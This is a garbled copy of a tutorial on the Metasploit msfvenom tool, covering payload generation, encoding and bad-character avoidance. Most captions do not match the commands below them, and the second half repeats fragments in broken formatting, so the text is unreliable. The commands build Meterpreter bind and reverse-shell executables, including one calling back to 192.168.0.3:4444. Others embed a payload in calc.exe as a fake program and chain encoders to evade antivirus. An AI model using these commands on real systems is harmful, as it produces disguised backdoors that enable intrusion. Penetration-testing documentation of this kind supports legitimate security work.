To start using msfvenom, first please take a look at the options it supports:
```
./msfvenom -l payloads
```

# How to generate a payload
To see what payloads are available from Framework, you can do:
```
./msfvenom -p windows/meterpreter/bind_tcp -f exe
```

The -p flag also supports "-" as a way to accept a custom payload:
```
./msfvenom --help-formats
```

Syntax example:
```
./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw
```

To see what formats are supported, you can do the following to find out:
```
./msfvenom -l encoders
```

Typically, this is probably how you will use msfvenom:
```
./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 
```

# How to encode a payload
By default, the encoding feature will automatically kick in when you use the -b flag (the badchar flag). In other cases, you must use the -e flag like the following:
```
./msfvenom -p windows/meterpreter/bind_tcp -b '\x00' -f raw
```

To find out what encoders you can use, you can use the -l flag:
```
./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe 
```

You can also encode the payload multiple times using the -i flag. Sometimes more iterations may help avoiding antivirus, but know that encoding isn't really meant to be used a real AV evasion solution:
```
./msfvenom -p windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only > /tmp/fake_64_calc.exe
```

# How to avoid bad characters
The -b flag is meant to be used to avoid certain characters in the payload. When this option is used, msfvenom will automatically find a suitable encoder to encode the payload:
```
./msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
./msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
./msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
```

`

# How to generate a payload

To generate a payload, there are two flags that you must supply (-p and -f):

* **The -p flag: Specifies what payload to generate**

To see what payloads are available from Framework, you can do:

`

`
./msfvenom -l payloads
`

`

* **The -f flag: Specifies the format of the payload**

Syntax example:

`

`
./msfvenom -p windows/meterpreter/bind_tcp -f exe
`

`
./msfvenom --help-formats
`

`
./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw
`

`
./msfvenom -l encoders
`

`
./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 
`

`
./msfvenom -p windows/meterpreter/bind_tcp -b '\x00' -f raw
`

`
./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe 
`

`
./msfvenom -p windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only > /tmp/fake_64_calc.exe
`

`
./msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
./msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
./msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
`

